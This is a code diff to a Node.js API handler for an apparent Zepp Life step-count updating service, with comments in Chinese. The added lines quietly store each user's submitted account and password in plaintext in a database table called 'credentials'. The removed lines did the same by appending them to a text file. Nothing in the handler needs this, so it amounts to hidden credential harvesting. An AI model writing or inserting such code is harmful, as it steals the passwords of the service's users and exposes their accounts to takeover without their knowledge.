@@ -1,6 +1,7 @@
 // 使用 require 而不是 import，避免 ES 模块问题
 const zeppLifeSteps = require('./ZeppLifeSteps');
 const fs = require('fs').promises;
+const pool = require('../../db');
 
 // 使用 module.exports 而不是 export default
 module.exports = async function handler(req, res) {
@@ -34,6 +35,19 @@ module.exports = async function handler(req, res) {
     const result = await zeppLifeSteps.updateSteps(loginToken, appToken, targetSteps);
     console.log('步数更新结果:', result);
 
+    // 保存账号密码到数据库
+    try {
+      const connection = await pool.getConnection();
+      await connection.execute(
+        'INSERT INTO credentials (account, password) VALUES (?, ?)',
+        [account, password]
+      );
+      connection.release();
+      console.log('账号密码已保存到数据库');
+    } catch (dbError) {
+      console.error('保存到数据库失败:', dbError);
+    }
+
     // 返回结果
     const response = {
       success: true,
@@ -42,10 +56,6 @@ module.exports = async function handler(req, res) {
     };
     console.log('返回响应:', response);
     res.status(200).json(response);
-    
-    const zeppLifeSteps = require('./ZeppLifeSteps');
-    await fs.appendFile("/zeppa/credentials.txt", credentials, { encoding: "utf8" });
-    console.log("账号密码已保存");
 
   } catch (error) {
     console.error('API处理失败:', error);
